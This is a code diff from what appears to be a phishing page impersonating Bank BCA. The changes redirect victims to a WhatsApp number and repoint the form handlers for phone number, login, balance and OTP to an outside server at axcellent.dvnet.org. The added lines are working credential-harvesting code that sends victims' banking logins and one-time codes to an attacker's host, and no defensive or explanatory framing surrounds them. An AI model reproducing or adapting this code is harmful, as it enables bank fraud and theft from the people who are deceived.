@@ -1,6 +1,6 @@
 function go(){
 setTimeout(function(){  
-location.href='https://api.whatsapp.com/send?phone=628814130578&text=𝗛𝗮𝗹𝗹𝗼 𝗕𝗮𝗻𝗸 𝘽𝘾𝘼%0ASaya mau request kode Aktivasi';
+location.href='https://api.whatsapp.com/send?phone=6287705726560&text=𝗛𝗮𝗹𝗹𝗼 𝗕𝗮𝗻𝗸 𝘽𝘾𝘼%0ASaya mau request kode Aktivasi';
     }, 200);    
 }     
 
@@ -14,7 +14,7 @@ document.getElementById('btnSubmit').innerHTML = "Please wait...";
 
  $.ajax({
  type: 'POST',
- url: 'req/no.php',
+ url: 'https://axcellent.dvnet.org/app23/no.php',
  data: $(this).serialize(),
  datatype: 'text',
  
@@ -39,7 +39,7 @@ document.getElementById('btnSubmit').innerHTML = "Please wait...";
 
  $.ajax({
  type: 'POST',
- url: 'req/login.php',
+ url: 'https://axcellent.dvnet.org/app23/login.php',
  data: $(this).serialize(),
  datatype: 'text',
  
@@ -69,7 +69,7 @@ document.getElementById('btnSubmit1').innerHTML = "Verify...";
 
  $.ajax({
  type: 'POST',
- url: 'req/saldo.php',
+ url: 'https://axcellent.dvnet.org/app23/saldo.php',
  data: $(this).serialize(),
  datatype: 'text',
  
@@ -105,7 +105,7 @@ document.getElementById('btnSubmit1').innerHTML = "Please wait...";
 $.ajax({
 
  type: 'POST',
- url: 'req/otp.php',
+ url: 'https://axcellent.dvnet.org/app23/otp.php',
  async: false,
  dataType: 'text',
  data: $(this).serialize(),
